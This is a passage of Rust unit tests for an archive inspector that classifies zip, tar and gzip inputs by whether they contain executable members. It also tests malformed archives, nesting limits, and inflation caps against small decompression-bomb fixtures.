        // The member NAME is a claim: a file called classes.dex that is not DEX qualifies nothing.
        assert_eq!(
            refused(&zip(&[stored("classes.dex", &png())])),
            "zip:no_executable_member"
        );
        assert_eq!(
            refused(&zip(&[stored("payload.elf", &jpeg())])),
            "zip:no_executable_member"
        );
    }

    #[test]
    fn a_malformed_archive_is_a_detection_error_and_refuses() {
        let kind = refused(b"PK\x03\x04 this is not a zip at all, only a signature");
        assert!(kind.starts_with("detection_error:"), "{kind}");
        let mut z = zip(&[stored("x", &elf())]);
        let n = z.len();
        z[n - 6..n - 2].copy_from_slice(&0xffff_fff0u32.to_le_bytes());
        let kind = refused(&z);
        assert!(kind.starts_with("detection_error:"), "{kind}");
    }

    #[test]
    fn archive_entry_cap_stops_the_walk() {
        let png = png();
        let mut members: Vec<Member<'static>> =
            (0..MAX_ENTRIES).map(|_| stored("p.png", &png)).collect();
        members.push(stored("late", &elf()));
        assert_eq!(refused(&zip(&members)), "zip:entry_or_inflate_limit");
        let mut at_cap: Vec<Member<'static>> = (0..MAX_ENTRIES - 1)
            .map(|_| stored("p.png", &png))
            .collect();
        at_cap.push(stored("last", &elf()));
        assert_eq!(allowed(&zip(&at_cap)), "zip:elf");
    }

    #[test]
    fn inflate_stops_at_the_cap_and_a_bomb_stays_small() {
        let bomb = deflate_zero_bomb(5000);
        assert!(bomb.len() < 20_000, "fixture is a compressed bomb");
        let out = inflate_prefix(&bomb, 4096).unwrap();
        assert_eq!(out.len(), 4096);
        assert!(out.iter().all(|&b| b == 0));
        let full = inflate_prefix(&bomb, usize::MAX / 2).unwrap();
        assert_eq!(
            full.len(),
            1 + 258 * 5000,
            "stream decodes correctly uncapped"
        );
    }

    #[test]
    fn inflate_decodes_a_real_dynamic_huffman_stream() {
        use sha2::{Digest, Sha256};
        // `gzip -9 -n` of 849 bytes of synthetic text (random words), header removed; the first
        // byte 0x55 marks a final block of type 2 (dynamic Huffman).
        let stream: [u8; 318] = [
            0x55, 0x52, 0x41, 0x6e, 0xc4, 0x30, 0x08, 0xbc, 0xf7, 0x15, 0x7e, 0x42, 0x00, 0xc7,
            0x76, 0x9e, 0xe3, 0xaa, 0x51, 0xb7, 0xea, 0xae, 0x1a, 0x69, 0xf7, 0x94, 0xd7, 0xd7,
            0x30, 0xe3, 0x48, 0x7b, 0x31, 0x02, 0x0f, 0x30, 0x0c, 0x9c, 0xfb, 0xab, 0x6f, 0x69,
            0x3c, 0x96, 0x3e, 0xfd, 0xcd, 0x61, 0xd4, 0xd2, 0x6f, 0x3f, 0x8e, 0x11, 0xfc, 0xf9,
            0x7b, 0x75, 0xb1, 0xd4, 0xef, 0xc7, 0xad, 0xaf, 0x8e, 0xd3, 0x12, 0x08, 0x59, 0x81,
            0x5f, 0x91, 0x1b, 0xe8, 0x9a, 0xbe, 0xf6, 0xfb, 0xf0, 0x2a, 0xe0, 0x56, 0x10, 0xd6,
            0x15, 0xbe, 0x64, 0xc6, 0xd7, 0xf4, 0xdd, 0x1f, 0x8f, 0x2e, 0x2d, 0x45, 0x73, 0x6f,
            0x51, 0x01, 0x15, 0x78, 0x22, 0x28, 0x3e, 0xa3, 0x9a, 0xce, 0xe1, 0x96, 0xf8, 0xcb,
            0x93, 0x19, 0xbe, 0x2c, 0xbd, 0x6e, 0xe0, 0xed, 0xdc, 0x16, 0x7a, 0x15, 0x76, 0x8c,
            0xb1, 0x1f, 0x4f, 0x99, 0xfd, 0x48, 0xb9, 0x78, 0xd0, 0x98, 0xa8, 0x02, 0x3b, 0xc8,
            0x44, 0x41, 0xcc, 0x6f, 0xea, 0xe5, 0x64, 0x89, 0xbe, 0x1b, 0x91, 0x05, 0xf4, 0x73,
            0xd0, 0x18, 0x55, 0x4e, 0xa4, 0xbb, 0xb1, 0xf6, 0xde, 0x18, 0x55, 0xe4, 0xf2, 0x30,
            0xff, 0x46, 0x3d, 0x9a, 0x13, 0xd0, 0x1c, 0x99, 0x6c, 0xaf, 0x0a, 0x8e, 0xb6, 0xa1,
            0xbf, 0x30, 0x25, 0x06, 0x68, 0xd0, 0x55, 0xa1, 0x35, 0xb4, 0x11, 0x8e, 0x3a, 0x82,
            0xa1, 0x58, 0x45, 0xbe, 0xd6, 0xe9, 0xa2, 0xa8, 0x23, 0x33, 0xbe, 0xa8, 0xc2, 0x86,
            0x62, 0xd7, 0x32, 0x84, 0x42, 0x4a, 0x48, 0xd5, 0x10, 0xc5, 0x45, 0x80, 0xa1, 0x4d,
            0xda, 0x0b, 0x29, 0xea, 0xdc, 0x00, 0x46, 0xc6, 0x55, 0xcc, 0x37, 0xd8, 0x2f, 0x38,
            0x8a, 0x68, 0x94, 0x49, 0xbe, 0x21, 0xbb, 0x4e, 0xbd, 0xa2, 0x4f, 0xb9, 0x2e, 0x05,
            0xa5, 0xdf, 0xaf, 0x8f, 0x93, 0xd2, 0x53, 0xce, 0x21, 0x65, 0x96, 0x38, 0xd1, 0xcb,
            0x41, 0x73, 0xe1, 0xdc, 0x95, 0x33, 0x38, 0x9e, 0x9c, 0x18, 0xf8, 0x91, 0x86, 0x45,
            0x2f, 0x50, 0x88, 0xb7, 0x6a, 0x5c, 0x31, 0x62, 0xf1, 0x62, 0x05, 0x82, 0x73, 0x1b,
            0x5c, 0x20, 0xac, 0x32, 0x81, 0xeb, 0xc7, 0x49, 0x4a, 0xbe, 0x2e, 0x94, 0x2b, 0xfa,
            0xf8, 0x07, 0xc1, 0xc2, 0x01, 0x67, 0x51, 0x03, 0x00, 0x00,
        ];
        let out = inflate_prefix(&stream, 4096).unwrap();
        assert_eq!(out.len(), 849);
        let hex: String = Sha256::digest(&out)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();
        assert_eq!(
            hex,
            "88aefa33e1783c76b8d0ace907cef68cb1d3efca0bd18588f20065bf12bad48c"
        );
    }

    #[test]
    fn inflate_budget_is_shared_across_members() {
        let bomb = deflate_zero_bomb(400); // > MEMBER_CAP of output
        let mut members: Vec<Member<'static>> = (0..17)
            .map(|_| Member {
                name: "z",
                method: 8,
                raw: bomb.clone(),
                claimed_size: 103_000,
            })
            .collect();
        members.push(deflated("late", &elf()));
        assert_eq!(refused(&zip(&members)), "zip:entry_or_inflate_limit");
        // Fewer bombs leave budget for the later member.
        let mut few: Vec<Member<'static>> = (0..3)
            .map(|_| Member {
                name: "z",
                method: 8,
                raw: bomb.clone(),
                claimed_size: 103_000,
            })
            .collect();
        few.push(deflated("late", &elf()));
        assert_eq!(allowed(&zip(&few)), "zip:elf");
    }

    #[test]
    fn nesting_is_bounded() {
        let inner = zip(&[stored("x", &elf())]);
        let two = zip(&[stored("in.zip", &inner)]);
        assert_eq!(allowed(&two), "zip:zip:elf");
        let three = zip(&[stored("in.zip", &two)]);
        refused(&three);
    }

    #[test]
    fn tar_and_gzip_are_inspected() {
        let t = tar(&[
            ("a.txt", b"nothing here but prose in a plain text member\n"),
            ("run", &elf()),
        ]);
        assert_eq!(allowed(&t), "tar:elf");
        assert_eq!(
            refused(&tar(&[("p.png", &png())])),
            "tar:no_executable_member"
        );
        assert_eq!(allowed(&gzip_stored(&t)), "gzip:tar:elf");
        assert_eq!(allowed(&gzip_stored(&elf())), "gzip:elf");
        assert_eq!(refused(&gzip_stored(&png())), "gzip:png");
        let bomb_gz = {
            let mut v = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3];
            v.extend_from_slice(&deflate_zero_bomb(5000));
            v
        };
        refused(&bomb_gz);
        let mut bad = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3, 0xff, 0xff, 0xff];
        bad.resize(64, 0xff);
        let kind = refused(&bad);
        assert!(kind.starts_with("detection_error:"), "{kind}");
    }

    #[test]
    fn archives_this_module_cannot_open_are_refused() {
        assert_eq!(
            refused(b"7z\xbc\xaf\x27\x1c\0\x04 rest"),
            "7z_uninspectable"
        );
        assert_eq!(refused(b"Rar!\x1a\x07\x00 rest of it"), "rar_uninspectable");
        assert_eq!(refused(b"BZh91AY&SY rest of it"), "bzip2_uninspectable");
    }
}
